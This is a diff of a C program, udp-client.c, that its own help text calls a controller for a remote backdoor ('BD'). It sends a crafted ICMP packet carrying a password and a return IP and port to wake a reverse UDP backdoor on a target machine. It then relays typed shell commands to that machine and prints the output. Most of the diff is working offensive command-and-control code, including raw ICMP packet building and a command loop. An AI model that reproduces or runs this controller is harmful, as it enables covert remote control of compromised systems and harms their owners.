@@ -1,32 +1,29 @@
+/*
+ * udp-client.c
+ *
+ *  Created on: 2017年3月2日
+ *  Base On Multiple project from GIT
+ *  Thanks a lot!
+ *  ICMP code from https://github.com/DhavalKapil/icmptunnel
+ */
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/socket.h>
 #include <pthread.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
-
+#include <stdbool.h>
 enum STATUS {
 	CONNECTED, STANDBY
 };
-enum ACTIVE_INDEX{
-	ACT_COMMAND,
-	SELF_IP,
-	TARGET_IP,
-	PASSWD,
-	REVERSE_IP,
-	REVERSE_PORT
+enum ACTIVE_INDEX {
+	ACT_COMMAND, SELF_IP, TARGET_IP, PASSWD, REVERSE_IP, REVERSE_PORT
 };
-enum CONNECT_INDEX{
-	CON_COMMAND,
-	SERVER_IP,
-	SERVER_PORT
+enum CONNECT_INDEX {
+	CON_COMMAND, SERVER_IP, SERVER_PORT
 };
-struct sockaddr_in addr;
+
 struct icmp_packet {
 	char src_addr[100];
 	char dest_addr[100];
@@ -35,67 +32,79 @@ struct icmp_packet {
 	int payload_size;
 };
 
-int sock = 0;
-char buff[512];
+/* struct for thread parameter */
+typedef struct {
+	struct sockaddr_in addr;
+	int udp_socket;
+	int peer_port;
+} NET_INFO;
 
+/* ICMP Protocol Functions */
 void set_reply_type(struct icmp_packet *packet);
 int open_icmp_socket();
 void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details);
-void close_icmp_socket(int sock_fd);
 uint16_t in_cksum(uint16_t *addr, int len);
 void prepare_headers(struct iphdr *ip, struct icmphdr *icmp);
 void set_echo_type(struct icmp_packet *packet);
 void active_remote(char params[5][32]);
-int parse_internal_cmd(char *buffer, char param[5][32]);
-int receiveMSG();
+/* endof ICMP Protocol Functions */
+
+int parse_internal_cmd(const char *buffer, char param[6][32]);
+void receiveMSG(void *param);
 
 int main(int argc, char **argv) {
+	const char BANNER[] = "UDP Controller \n";
 	char params[6][32];
-
-	printf("This is a UDP client\n		--solaris G1C\n");
-
 	int flag = STANDBY;
-
+	char cmd[128];
 	pthread_t thread_id;
 	int ret;
-	while (1) {
-		memset(buff, 0, sizeof(buff));
-		memset(params, 0, sizeof(params));
-		fgets(buff, 512, stdin);
-		buff[strlen(buff) - 1] = 0;
-		// internal command list
-		ret = parse_internal_cmd(buff, params);
-		if (strcmp(params[0], "active") == 0) {
+	NET_INFO nf;
 
+	printf(BANNER);
+	while (true) {
+		bzero(cmd, sizeof(cmd));
+		bzero(params, sizeof(params));
+
+		if(fgets(cmd, 128, stdin) == NULL)
+			continue;
+		/* remove '\n' at the end */
+		cmd[strlen(cmd) - 1] = 0;
+		/* internal command list */
+		ret = parse_internal_cmd(cmd, params);
+		/* waiting for remote connection and active remote*/
+		if (strcmp(params[0], "active") == 0) {
 			if (ret != 6) {
-				printf(
-						"usage: active self_IP target_IP passwd return_IP return_PORT\n");
+				printf(	"usage: active self_IP target_IP passwd return_IP return_PORT\n");
 				continue;
 			}
 			if (flag == CONNECTED) {
 				printf("Connection is busy, close it first\n");
 				continue;
 			}
-			sock = socket(AF_INET, SOCK_DGRAM, 0);
-			addr.sin_family = AF_INET;
-			addr.sin_port = htons(atoi(params[REVERSE_PORT]));
-			addr.sin_addr.s_addr = inet_addr(params[REVERSE_IP]);
-			bind(sock, (struct sockaddr *) &addr, sizeof(addr));
-
-			pthread_create(&thread_id, NULL, (void *) receiveMSG,
-			NULL);
-			printf("Create Thread %ld\n", thread_id);
-
+			nf.udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
+			nf.addr.sin_family = AF_INET;
+			nf.addr.sin_port = htons(atoi(params[REVERSE_PORT]));
+			nf.addr.sin_addr.s_addr = inet_addr(params[REVERSE_IP]);
+			bind(nf.udp_socket, (struct sockaddr *) &(nf.addr),
+					sizeof(nf.addr));
+			/* waiting for reverse bd connect*/
+			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void*) &nf);
 			flag = CONNECTED;
-
+			/* active remote reverse bd */
 			active_remote(params);
 			continue;
 		}
-
+		/* help command */
 		if (strcmp(params[0], "?") == 0) {
-			printf("internal command List:\nconnect\nactive\nclose\nbyebye\n");
+			printf("Internal Command List:\n----------------------------\n");
+			printf("connect\n\t connect TO remote UDP BD\n");
+			printf("active\n\t use special ICMP package active reverse UDP BD\n");
+			printf("close\n\t close all kinds of connections\n");
+			printf("byebye\n\t quit this program\n");
 			continue;
 		}
+		/* connect to remote bd */
 		if (strcmp(params[0], "connect") == 0) {
 			if (ret != 3) {
 				printf("usage: connect server_IP server_PORT\n");
@@ -106,69 +115,71 @@ int main(int argc, char **argv) {
 				continue;
 			}
 
-			sock = socket(AF_INET, SOCK_DGRAM, 0);
-			addr.sin_family = AF_INET;
-			addr.sin_port = htons(atoi(params[SERVER_PORT]));
-			addr.sin_addr.s_addr = inet_addr(params[SERVER_IP]);
-			pthread_create(&thread_id, NULL, (void *) receiveMSG,
-			NULL);
+			nf.udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
+			nf.addr.sin_family = AF_INET;
+			nf.addr.sin_port = htons(atoi(params[SERVER_PORT]));
+			nf.addr.sin_addr.s_addr = inet_addr(params[SERVER_IP]);
+			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void *) &nf);
 			flag = CONNECTED;
-			printf("Create Thread %ld\n", thread_id);
 			continue;
 		}
-		if (strcmp(buff, "close") == 0) {
-			if (sock != 0) {
-				printf("Close socket :%d \n", sock);
-				close(sock);
-				sock = 0;
-				printf("after Close socket :%d \n", sock);
+		/* close socket and cancel thread */
+		if (strcmp(params[0], "close") == 0) {
+			if (nf.udp_socket) {
+				printf("Close socket :%d \n", nf.udp_socket);
+				close(nf.udp_socket);
+				nf.udp_socket = 0;
 			}
 			if (thread_id)
-				if (pthread_cancel(thread_id) == 0)
-					printf("Thread Canceled\n");
+				pthread_cancel(thread_id); /* perhaps thread can not terminate successfully */
 			flag = STANDBY;
 			continue;
 		}
-		// exit command
-		if (strcmp(buff, "byebye") == 0) {
-			printf("Exit from client!\n");
+		/* exit command */
+		if (strcmp(params[0], "byebye") == 0) {
+			if (nf.udp_socket)
+				close(nf.udp_socket);
+			if (thread_id)
+				pthread_cancel(thread_id); /* perhaps thread can not terminate successfully */
+			printf("See you next time :-)\n");
 			break;
 		}
 		// process remote system shell command
 		if (flag == STANDBY)
 			continue;
-		printf("Send:%d %s\n", sock, buff);
-		sendto(sock, buff, strlen(buff), 0, (struct sockaddr *) &addr,
-				sizeof(addr));
+		sendto(nf.udp_socket, cmd, strlen(cmd), 0,
+				(struct sockaddr *) &(nf.addr), sizeof(nf.addr));
 	}
-
-	return 0;
+	return EXIT_SUCCESS;
 }
 
-int receiveMSG() {
+void receiveMSG(void *param) {
+	const int BUFFER_SIZE = 1024;
+	NET_INFO * nfp = (NET_INFO *) param;
+	ssize_t n;
+	socklen_t len = sizeof(nfp->addr);
+	char recv_buff[BUFFER_SIZE];
 	while (1) {
-		ssize_t n;
-		socklen_t retlen = sizeof(addr);
-		memset(buff, '\0', sizeof(buff));
-		n = recvfrom(sock, buff, 512, 0, (struct sockaddr *) &addr, &retlen);
+
+		bzero(recv_buff, sizeof(recv_buff));
+		n = recvfrom(nfp->udp_socket, recv_buff, 512, 0,
+				(struct sockaddr *) &(nfp->addr), &len);
 		pthread_testcancel();
 		if (n > 0) {
-			buff[n] = 0;
-			printf("%s", buff);
+			recv_buff[n] = 0;
+			printf("%s", recv_buff);
 		}
 	}
 }
 
-int parse_internal_cmd(char *buffer, char param[5][32]) {
-	const int param_count_max = 6;
+int parse_internal_cmd(const char *buffer, char param[5][32]) {
+	const int MAX_COUNT = 6;
 	char backup[512];
 	strcpy(backup, buffer);
 	char *token = strtok(backup, " ");
 	int param_count = 0;
-	while (token != NULL && param_count < param_count_max) {
-		/* While there are tokens in "string" */
+	while (token != NULL && param_count < MAX_COUNT) {
 		strcpy(param[param_count], token);
-		/* Get next token: */
 		token = strtok(NULL, " ");
 		++param_count;
 	}
@@ -185,7 +196,6 @@ void active_remote(char params[6][32]) {
 	int sock_fd;
 	char command[512];
 
-
 	strncpy(packet.src_addr, self_ip, strlen(self_ip) + 1);
 	strncpy(packet.dest_addr, dest, strlen(dest) + 1);
 	set_echo_type(&packet);
@@ -195,13 +205,11 @@ void active_remote(char params[6][32]) {
 
 	packet.payload = command;
 	packet.payload_size = strlen(packet.payload);
-
 	sock_fd = open_icmp_socket();
-
 	send_icmp_packet(sock_fd, &packet);
-
-	close_icmp_socket(sock_fd);
+	close(sock_fd);
 }
+
 void set_reply_type(struct icmp_packet *packet) {
 	packet->type = ICMP_ECHOREPLY;
 }
@@ -231,6 +239,7 @@ int open_icmp_socket() {
 
 	return sock_fd;
 }
+
 void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details) {
 	// Source and destination IPs
 	struct in_addr src_addr;
@@ -253,7 +262,7 @@ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details) {
 	packet = calloc(packet_size, sizeof(uint8_t));
 	if (packet == NULL) {
 		perror("No memory available\n");
-		close_icmp_socket(sock_fd);
+		close(sock_fd);
 		exit(EXIT_FAILURE);
 	}
 
@@ -285,10 +294,6 @@ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details) {
 			sizeof(struct sockaddr_in));
 
 	free(packet);
-}
-
-void close_icmp_socket(int sock_fd) {
-	close(sock_fd);
 }
 
 uint16_t in_cksum(uint16_t *addr, int len) {
